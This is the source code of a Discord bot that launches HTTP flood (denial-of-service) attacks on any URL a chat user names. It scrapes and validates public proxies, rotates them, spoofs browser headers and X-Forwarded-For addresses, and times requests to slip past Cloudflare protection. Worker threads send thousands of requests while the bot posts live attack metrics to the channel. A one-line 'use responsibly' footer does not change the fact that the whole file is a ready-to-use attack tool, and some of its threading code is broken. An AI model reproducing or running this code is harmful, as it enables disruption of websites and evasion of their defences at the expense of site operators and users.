const { Client, IntentsBitField, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const fetch = require('node-fetch');
const UserAgent = require('fake-useragent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const url = require('url');
const { promisify } = require('util');
const sleep = promisify(setTimeout);

// --- Configuration ---
const PREFIX = '!';
const PROXY_SOURCES = [
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https',
    'https://www.proxy-list.download/api/v1/get?type=socks4',
    'https://www.proxy-list.download/api/v1/get?type=socks5'
];
const PROXY_VALIDATION_URL = 'http://httpbin.org/status/200'; // URL to test proxies
const PROXY_VALIDATION_TIMEOUT = 5000; // 5 seconds for proxy validation
const REQUEST_TIMEOUT = 7000; // 7 seconds for actual attack requests
const NUM_WORKERS = 4; // Number of worker threads to spawn
const TOTAL_REQUESTS_TARGET = 5000; // Target total requests per attack cycle
const CLOUDFLARE_BYPASS_DELAY_MS = 50; // Max random delay between requests for Cloudflare bypass (0-50ms)
const MONITOR_INTERVAL = 15000; // 15 seconds for attack monitoring updates
const PROXY_REFETCH_THRESHOLD = 50; // Refetch proxies if available proxies drop below this number

// --- Global State ---
let proxies = []; // Stores validated proxies { ip, port, type }
const proxyBlacklist = new Set(); // Temporarily blacklist bad proxies
let attackActive = false;
let targetUrl = '';
let attackChannel = null;
let activeWorkers = []; // Stores Worker instances
const ua = new UserAgent(); // User-Agent generator
let attackMetrics = {
    totalRequestsSent: 0,
    successfulRequests: 0,
    startTime: 0,
    lastReportTime: 0,
    lastReportSuccessCount: 0,
    cloudflareDetections: 0
};
let stopSignal = false; // Flag to signal workers to stop
let monitorIntervalId = null; // ID for the monitoring interval

// --- Discord Bot Setup ---
const client = new Client({
    intents: [
        IntentsBitField.Flags.Guilds,
        IntentsBitField.Flags.GuildMessages,
        IntentsBitField.Flags.MessageContent
    ]
});

// --- Logger ---
const logger = {
    info: (msg) => console.log(`[${new Date().toISOString()}] INFO: ${msg}`),
    error: (msg) => console.error(`[${new Date().toISOString()}] ERROR: ${msg}`),
    debug: (msg) => console.debug(`[${new Date().toISOString()}] DEBUG: ${msg}`)
};

/**
 * Fetches proxies from defined sources and validates them.
 * Adds valid proxies to the global `proxies` array.
 */
async function fetchAndValidateProxies() {
    logger.info('Starting proxy fetch and validation...');
    let fetchedRawProxies = [];
    for (const source of PROXY_SOURCES) {
        try {
            const response = await fetch(source, { timeout: 10000 });
            if (response.ok) {
                const text = await response.text();
                const lines = text.split('\n').filter(line => line.includes(':'));
                const proxyType = source.split('type=')[1].toLowerCase();
                fetchedRawProxies.push(...lines.map(line => {
                    const [ip, port] = line.split(':');
                    return { ip, port, type: proxyType };
                }));
                logger.info(`Fetched ${lines.length} raw proxies from ${source}`);
            }
        } catch (e) {
            logger.error(`Failed to fetch proxies from ${source}: ${e.message}`);
        }
    }
    logger.info(`Total raw proxies fetched: ${fetchedRawProxies.length}`);

    if (fetchedRawProxies.length === 0) {
        logger.error('No raw proxies fetched from any source.');
        proxies = []; // Clear current proxies
        return;
    }

    // Validate proxies
    const validatedProxies = [];
    logger.info('Validating fetched proxies...');
    const validationPromises = fetchedRawProxies.map(async (proxy) => {
        if (proxyBlacklist.has(`${proxy.ip}:${proxy.port}`)) {
            logger.debug(`Skipping blacklisted proxy: ${proxy.ip}:${proxy.port}`);
            return null;
        }
        try {
            const agent = createProxyAgent(proxy);
            const response = await axios.get(PROXY_VALIDATION_URL, {
                httpsAgent: agent,
                timeout: PROXY_VALIDATION_TIMEOUT,
                validateStatus: () => true // Accept all status codes for validation
            });
            if (response.status === 200) {
                validatedProxies.push(proxy);
                // logger.debug(`Validated proxy: ${proxy.ip}:${proxy.port}`);
            } else {
                logger.debug(`Failed validation for proxy ${proxy.ip}:${proxy.port} (Status: ${response.status})`);
            }
        } catch (e) {
            // logger.debug(`Failed validation for proxy ${proxy.ip}:${proxy.port}: ${e.message}`);
            proxyBlacklist.add(`${proxy.ip}:${proxy.port}`); // Add to blacklist on validation failure
        }
    });

    await Promise.allSettled(validationPromises); // Wait for all validations to complete
    proxies = validatedProxies;
    logger.info(`Total valid proxies after validation: ${proxies.length}`);
    if (proxies.length === 0) {
        logger.warn('No valid proxies found. Requests will be made directly.');
    }
}

/**
 * Creates an appropriate proxy agent based on proxy type.
 * @param {object} proxy - Proxy object with ip, port, and type.
 * @returns {SocksProxyAgent|HttpsProxyAgent|null} An agent instance or null if direct.
 */
function createProxyAgent(proxy) {
    if (!proxy) return null;
    const proxyUrl = `${proxy.ip}:${proxy.port}`;
    if (proxy.type.startsWith('socks')) {
        return new SocksProxyAgent(`${proxy.type}://${proxyUrl}`);
    } else { // http or https
        return new HttpsProxyAgent(`http://${proxyUrl}`);
    }
}

/**
 * Generates randomized HTTP headers to mimic browser traffic.
 * @returns {object} Headers object.
 */
function getRandomHeaders() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/108.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
    ];

    const acceptTypes = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/plain, */*; q=0.01"
    ];

    const acceptLanguages = [
        "en-US,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9"
    ];

    const referers = [
        "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
        "https://www.yahoo.com/", "https://facebook.com/", "https://twitter.com/"
    ];

    return {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': acceptTypes[Math.floor(Math.random() * acceptTypes.length)],
        'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'Referer': referers[Math.floor(Math.random() * referers.length)],
        'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`, // Simulate different IPs
        'DNT': '1', // Do Not Track
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Site': ['none', 'same-origin', 'cross-site'][Math.floor(Math.random() * 3)],
        'Pragma': 'no-cache'
    };
}

/**
 * Makes a single HTTP request to the target URL.
 * Handles proxy usage, timeouts, and Cloudflare detection.
 * @param {string} targetUrl - The URL to request.
 * @param {object|null} proxy - The proxy object to use, or null for direct.
 * @returns {boolean} True if the request was successful (200 status code), false otherwise.
 */
async function makeRequest(targetUrl, proxy = null) {
    try {
        const agent = createProxyAgent(proxy);
        
        const axiosConfig = {
            headers: getRandomHeaders(),
            timeout: REQUEST_TIMEOUT,
            validateStatus: () => true // Accept all status codes to check for Cloudflare or other issues
        };

        if (agent) {
            axiosConfig.httpsAgent = agent;
            axiosConfig.httpAgent = agent; // For http targets
        }
        
        const response = await axios.get(targetUrl, axiosConfig);
        
        // Cloudflare detection
        if (response.status === 503 || response.status === 403 || response.status === 429) {
            const html = response.data;
            if (typeof html === 'string' && html.includes('cf-wrapper')) {
                // logger.debug(`Cloudflare protection detected via ${proxy ? proxy.ip : 'direct'} for ${targetUrl}`);
                if (proxy) proxyBlacklist.add(`${proxy.ip}:${proxy.port}`); // Blacklist proxy if it hits CF
                return { success: false, cfDetected: true };
            }
        }
        
        if (response.status === 200) {
            return { success: true, cfDetected: false };
        } else {
            // logger.debug(`Request failed via ${proxy ? proxy.ip : 'direct'} to ${targetUrl} (Status: ${response.status})`);
            if (proxy) proxyBlacklist.add(`${proxy.ip}:${proxy.port}`); // Blacklist proxy on non-200 too
            return { success: false, cfDetected: false };
        }
    } catch (e) {
        // logger.debug(`Request error via ${proxy ? proxy.ip : 'direct'} to ${targetUrl}: ${e.message}`);
        if (proxy) proxyBlacklist.add(`${proxy.ip}:${proxy.port}`); // Blacklist proxy on error
        return { success: false, cfDetected: false };
    }
}

// --- Worker Thread Logic ---
if (!isMainThread) {
    parentPort.on('message', async (message) => {
        if (message.type === 'start') {
            const { url, numRequests, proxies, stopSignalFlag } = message.data;
            let successCount = 0;
            let cfDetectCount = 0;

            for (let i = 0; i < numRequests; i++) {
                // Check stop signal periodically
                if (stopSignalFlag.value === true) { // Use .value for shared memory boolean
                    logger.info(`Worker ${process.threadId} received stop signal. Exiting.`);
                    break;
                }

                const proxy = proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;
                const result = await makeRequest(url, proxy);
                if (result.success) {
                    successCount++;
                }
                if (result.cfDetected) {
                    cfDetectCount++;
                }
                
                // Random delay for Cloudflare bypass / rate limit avoidance
                await sleep(Math.random() * CLOUDFLARE_BYPASS_DELAY_MS); 
            }
            parentPort.postMessage({ type: 'result', successCount, cfDetectCount });
        }
    });

    // Helper for creating agent (needed in worker context)
    function createProxyAgent(proxy) {
        if (!proxy) return null;
        const proxyUrl = `${proxy.ip}:${proxy.port}`;
        if (proxy.type.startsWith('socks')) {
            return new SocksProxyAgent(`${proxy.type}://${proxyUrl}`);
        } else { // http or https
            return new HttpsProxyAgent(`http://${proxyUrl}`);
        }
    }

    // Helper for getRandomHeaders (needed in worker context)
    function getRandomHeaders() {
        const userAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/108.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"
        ];

        const acceptTypes = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "application/json, text/javascript, */*; q=0.01",
            "text/plain, */*; q=0.01"
        ];

        const acceptLanguages = [
            "en-US,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9"
        ];

        const referers = [
            "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
            "https://www.yahoo.com/", "https://facebook.com/", "https://twitter.com/"
        ];

        return {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': acceptTypes[Math.floor(Math.random() * acceptTypes.length)],
            'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': referers[Math.floor(Math.random() * referers.length)],
            'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'DNT': '1',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Site': ['none', 'same-origin', 'cross-site'][Math.floor(Math.random() * 3)],
            'Pragma': 'no-cache'
        };
    }

    // makeRequest also needed in worker context
    async function makeRequest(targetUrl, proxy = null) {
        try {
            const agent = createProxyAgent(proxy);
            
            const axiosConfig = {
                headers: getRandomHeaders(),
                timeout: REQUEST_TIMEOUT,
                validateStatus: () => true
            };

            if (agent) {
                axiosConfig.httpsAgent = agent;
                axiosConfig.httpAgent = agent;
            }
            
            const response = await axios.get(targetUrl, axiosConfig);
            
            if (response.status === 503 || response.status === 403 || response.status === 429) {
                const html = response.data;
                if (typeof html === 'string' && html.includes('cf-wrapper')) {
                    return { success: false, cfDetected: true };
                }
            }
            
            if (response.status === 200) {
                return { success: true, cfDetected: false };
            } else {
                return { success: false, cfDetected: false };
            }
        } catch (e) {
            return { success: false, cfDetected: false };
        }
    }
}


/**
 * Initiates and manages the flood attack using worker threads.
 * @param {string} url - The target URL for the attack.
 */
async function flood(url) {
    if (proxies.length < PROXY_REFETCH_THRESHOLD) {
        logger.info(`Proxies count (${proxies.length}) below threshold. Refetching and validating proxies...`);
        await fetchAndValidateProxies();
    }

    if (proxies.length === 0) {
        logger.warn('No valid proxies available. Proceeding with direct requests.');
    }

    stopSignal = false; // Reset stop signal for new attack
    attackMetrics = {
        totalRequestsSent: 0,
        successfulRequests: 0,
        startTime: Date.now(),
        lastReportTime: Date.now(),
        lastReportSuccessCount: 0,
        cloudflareDetections: 0
    };

    const requestsPerWorker = Math.ceil(TOTAL_REQUESTS_TARGET / NUM_WORKERS);
    activeWorkers = [];

    // Create a shared ArrayBuffer to signal workers to stop
    // Using a typed array to store the boolean flag for shared memory
    const stopSignalBuffer = new SharedArrayBuffer(1);
    const stopSignalFlag = new Uint8Array(stopSignalBuffer);
    stopSignalFlag[0] = 0; // 0 for false, 1 for true

    logger.info(`Starting flood attack on ${url} with ${NUM_WORKERS} workers, targeting ${TOTAL_REQUESTS_TARGET} requests.`);
    if (attackChannel) {
        attackChannel.send(`Starting flood attack on **${url}** with **${NUM_WORKERS} workers** aiming for **${TOTAL_REQUESTS_TARGET} requests**.`)
    }

    // Start monitoring interval
    monitorIntervalId = setInterval(() => {
        const currentTime = Date.now();
        const durationSinceLastReport = (currentTime - attackMetrics.lastReportTime) / 1000;
        const requestsSinceLastReport = attackMetrics.successfulRequests - attackMetrics.lastReportSuccessCount;
        const currentRPS = durationSinceLastReport > 0 ? (requestsSinceLastReport / durationSinceLastReport).toFixed(2) : 0;
        const totalDuration = (currentTime - attackMetrics.startTime) / 1000;
        const overallRPS = totalDuration > 0 ? (attackMetrics.successfulRequests / totalDuration).toFixed(2) : 0;

        const embed = new EmbedBuilder()
            .setTitle('Attack Progress Update')
            .setColor('#FFA500') // Orange for ongoing
            .addFields(
                { name: 'Target URL', value: targetUrl, inline: true },
                { name: 'Status', value: 'Active', inline: true },
                { name: 'Total Successful Requests', value: attackMetrics.successfulRequests.toString(), inline: true },
                { name: 'Current RPS (Last 15s)', value: currentRPS.toString(), inline: true },
                { name: 'Overall RPS', value: overallRPS.toString(), inline: true },
                { name: 'Cloudflare Detections', value: attackMetrics.cloudflareDetections.toString(), inline: true },
                { name: 'Elapsed Time', value: `${totalDuration.toFixed(0)}s`, inline: true },
                { name: 'Proxies Remaining', value: proxies.length.toString(), inline: true }
            )
            .setTimestamp();

        if (attackChannel) {
            attackChannel.send({ embeds: [embed] }).catch(err => logger.error(`Failed to send monitor message: ${err.message}`));
        }
        
        attackMetrics.lastReportTime = currentTime;
        attackMetrics.lastReportSuccessCount = attackMetrics.successfulRequests;
    }, MONITOR_INTERVAL);


    for (let i = 0; i < NUM_WORKERS; i++) {
        activeWorkers.push(new Promise((resolve, reject) => {
            const worker = new Worker(__filename, {
                workerData: { url, numRequests: requestsPerWorker, proxies, stopSignalFlag: { value: stopSignalFlag[0] } } // Pass initial stop signal value
            });

            worker.on('message', (message) => {
                if (message.type === 'result') {
                    attackMetrics.successfulRequests += message.successCount;
                    attackMetrics.cloudflareDetections += message.cfDetectCount;
                    resolve();
                }
            });

            worker.on('error', (err) => {
                logger.error(`Worker ${worker.threadId} error: ${err.message}`);
                reject(err);
            });

            worker.on('exit', (code) => {
                if (code !== 0) {
                    logger.error(`Worker ${worker.threadId} stopped with exit code ${code}`);
                    reject(new Error(`Worker ${worker.threadId} stopped with exit code ${code}`));
                } else {
                    // logger.info(`Worker ${worker.threadId} exited successfully.`);
                }
            });

            // Send message to worker to start its task with the SharedArrayBuffer for stop signal
            worker.postMessage({
                type: 'start',
                data: {
                    url,
                    numRequests: requestsPerWorker,
                    proxies,
                    stopSignalFlag: { value: stopSignalFlag } // Pass the Uint8Array view itself
                }
            });
        }));
    }

    try {
        await Promise.all(activeWorkers);
        const duration = (Date.now() - attackMetrics.startTime) / 1000;
        const requestsPerSecond = attackMetrics.successfulRequests / duration;
        
        const finalEmbed = new EmbedBuilder()
            .setTitle('Attack Completed!')
            .setColor('#00FF00') // Green for completion
            .addFields(
                { name: 'Target URL', value: targetUrl },
                { name: 'Total Successful Requests', value: attackMetrics.successfulRequests.toString(), inline: true },
                { name: 'Overall Requests/Second', value: requestsPerSecond.toFixed(2), inline: true },
                { name: 'Total Cloudflare Detections', value: attackMetrics.cloudflareDetections.toString(), inline: true },
                { name: 'Total Duration', value: `${duration.toFixed(2)} seconds`, inline: true }
            )
            .setTimestamp();

        logger.info(`Flood completed for ${url}. Total successful requests: ${attackMetrics.successfulRequests} in ${duration.toFixed(2)} seconds (${requestsPerSecond.toFixed(2)} req/s).`);
        if (attackChannel) {
            attackChannel.send({ embeds: [finalEmbed] });
        }
    } catch (error) {
        const errorEmbed = new EmbedBuilder()
            .setTitle('Attack Failed!')
            .setColor('#FF0000')
            .setDescription(`Flood attack to ${url} failed: ${error.message}`)
            .setTimestamp();
        logger.error(`Flood attack to ${url} failed: ${error.message}`);
        if (attackChannel) {
            attackChannel.send({ embeds: [errorEmbed] });
        }
    } finally {
        attackActive = false; // Reset attack status
        activeWorkers.forEach(workerPromise => {
            // No direct terminate call here, as workers should exit gracefully with stopSignal
            // If they are still running, they will naturally finish their current loops and check the signal.
            // Forcing termination (worker.terminate()) can lead to unhandled errors.
        });
        activeWorkers = []; // Clear worker references
        if (monitorIntervalId) {
            clearInterval(monitorIntervalId); // Stop monitoring
            monitorIntervalId = null;
        }
        stopSignalFlag[0] = 0; // Reset shared stop signal
    }
}

// --- Discord Bot Event Listeners ---
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'startattack') {
        if (attackActive) {
            return message.reply('An attack is already active. Please stop it first with `!stopattack`.');
        }
        const urlToAttack = args[0];
        if (!urlToAttack) {
            return message.reply('Please provide a URL to attack. Usage: `!startattack <URL>`');
        }
        
        try {
            new URL(urlToAttack); // Validate URL
        } catch (e) {
            return message.reply('Invalid URL provided. Make sure it includes http:// or https://');
        }

        targetUrl = urlToAttack;
        attackChannel = message.channel;
        attackActive = true;
        
        await flood(targetUrl); // Start the attack

    } else if (command === 'stopattack') {
        if (!attackActive) {
            return message.reply('No active attack to stop.');
        }

        stopSignal = true; // Set global stop signal
        // Signal workers to stop gracefully via shared memory
        if (activeWorkers.length > 0 && activeWorkers[0].workerData && activeWorkers[0].workerData.stopSignalFlag && activeWorkers[0].workerData.stopSignalFlag.value) {
            activeWorkers[0].workerData.stopSignalFlag.value[0] = 1; // Set the flag in the shared buffer
        }
        
        message.channel.send('Stopping the current flood attack. Please wait for workers to finish their current tasks...');
        logger.info('Stopping flood attack initiated by user.');

        // The flood function's finally block will handle cleanup
        // and send the final message once all workers have exited.
    } else if (command === 'status') {
        const totalDuration = attackActive ? (Date.now() - attackMetrics.startTime) / 1000 : 0;
        const overallRPS = attackActive && totalDuration > 0 ? (attackMetrics.successfulRequests / totalDuration).toFixed(2) : 'N/A';

        const statusEmbed = new EmbedBuilder()
            .setTitle('Attack Status')
            .setColor(attackActive ? '#FF0000' : '#00FF00')
            .addFields(
                { name: 'Attack Active', value: attackActive ? 'Yes' : 'No', inline: true },
                { name: 'Target URL', value: targetUrl || 'N/A', inline: true },
                { name: 'Number of Workers', value: NUM_WORKERS.toString(), inline: true },
                { name: 'Total Valid Proxies', value: proxies.length.toString(), inline: true },
                { name: 'Total Requests Sent (Approx)', value: attackMetrics.totalRequestsSent.toString(), inline: true },
                { name: 'Successful Requests', value: attackMetrics.successfulRequests.toString(), inline: true },
                { name: 'Overall RPS', value: overallRPS.toString(), inline: true },
                { name: 'Cloudflare Detections', value: attackMetrics.cloudflareDetections.toString(), inline: true }
            )
            .setTimestamp();
        
        message.channel.send({ embeds: [statusEmbed] });
    } else if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('Bot Commands')
            .setColor('#0099ff')
            .setDescription('Here are the available commands for the advanced flood bot:')
            .addFields(
                { name: `\`${PREFIX}startattack <URL>\``, value: 'Starts a flood attack on the specified URL. Example: `!startattack https://example.com`' },
                { name: `\`${PREFIX}stopattack\``, value: 'Stops any active flood attack. Workers will finish their current tasks.' },
                { name: `\`${PREFIX}status\``, value: 'Shows the current attack status, including live metrics.' },
                { name: `\`${PREFIX}help\``, value: 'Displays this help message.' }
            )
            .setFooter({ text: 'Use responsibly and only on sites you have permission to test.' })
            .setTimestamp();
        
        message.channel.send({ embeds: [helpEmbed] });
    } else if (command === 'fetchproxies') {
        message.channel.send('Attempting to fetch and validate new proxies...');
        await fetchAndValidateProxies();
        message.channel.send(`Proxy refresh complete. Loaded ${proxies.length} valid proxies.`);
    }
});

// --- Bot Login ---
client.once('ready', async () => {
    logger.info(`Logged in as ${client.user.tag}!`);
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
    client.user.setActivity('for commands | !help', { type: 'WATCHING' });
    
    // Initial proxy fetch on startup
    await fetchAndValidateProxies();
});

// Replace 'YOUR_DISCORD_BOT_TOKEN' with your actual bot token
// For security, consider using environment variables for your token.
client.login('YOUR_DISCORD_BOT_TOKEN'); 
